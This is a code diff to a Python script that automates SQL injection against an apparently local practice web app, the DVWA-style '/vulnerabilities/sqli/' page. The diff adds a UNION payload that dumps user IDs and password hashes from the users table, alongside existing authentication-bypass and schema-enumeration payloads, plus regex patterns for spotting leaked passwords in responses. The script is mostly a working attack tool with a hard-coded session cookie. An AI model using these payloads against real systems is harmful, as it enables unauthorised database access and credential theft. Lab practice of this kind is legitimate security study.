@@ -8,7 +8,7 @@ urls = {
     'sqli': 'http://127.0.0.1/vulnerabilities/sqli/',
 }
 cookies = {
-    'PHPSESSID': '2vel43slr3e634clddgoe44jt5',  # Replace with your actual session cookie
+    'PHPSESSID': 'g43vcqs3if838v561gfau6eah5',  # Replace with your actual session cookie
     'security': 'low'  # Change security level here (low, medium, high)
 }
 
@@ -17,8 +17,10 @@ payloads = {
     "Classic SQL Injection": "' OR '1'='1'-- ",
     "Union-based - Tables": "' UNION SELECT table_name, NULL FROM information_schema.tables -- ",
     "Union-based - Users": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- ",
-    "Union-based - Database": "' UNION SELECT null, database()-- "  # Added payload
+    "Union-based - Database": "' UNION SELECT null, database()-- ",
+    "Union-based - User Passwords": "' UNION SELECT user_id, password FROM users-- "
 }
+
 
 def submit_payload(url, payload_name, payload):
     """Submit payloads to the web application and print the results."""
@@ -68,7 +70,8 @@ def analyze_content_changes(original_content, injected_content):
         re.compile(r"users?", re.IGNORECASE),  # Detect changes related to user information
         re.compile(r"table names?", re.IGNORECASE),  # Detect changes related to table names
         re.compile(r"sql injection", re.IGNORECASE),  # General term to see if the page displays injection-related info
-        re.compile(r"database", re.IGNORECASE)  # Detect database name changes
+        re.compile(r"database", re.IGNORECASE), # Detect database name changes
+        re.compile(r"password", re.IGNORECASE)  # Detect changes related to passwords
     ]
     
     for pattern in patterns:
@@ -87,7 +90,8 @@ def extract_relevant_content(original_content, injected_content):
         re.compile(r"ID: ' OR '1'='1'--", re.IGNORECASE),
         re.compile(r"table_name", re.IGNORECASE),
         re.compile(r"column_name", re.IGNORECASE),
-        re.compile(r"database", re.IGNORECASE)  # Added pattern for database results
+        re.compile(r"database", re.IGNORECASE),  # Added pattern for database results
+        re.compile(r"password", re.IGNORECASE)  # Detect changes related to passwords
     ]
     
     for start_pattern in start_patterns:
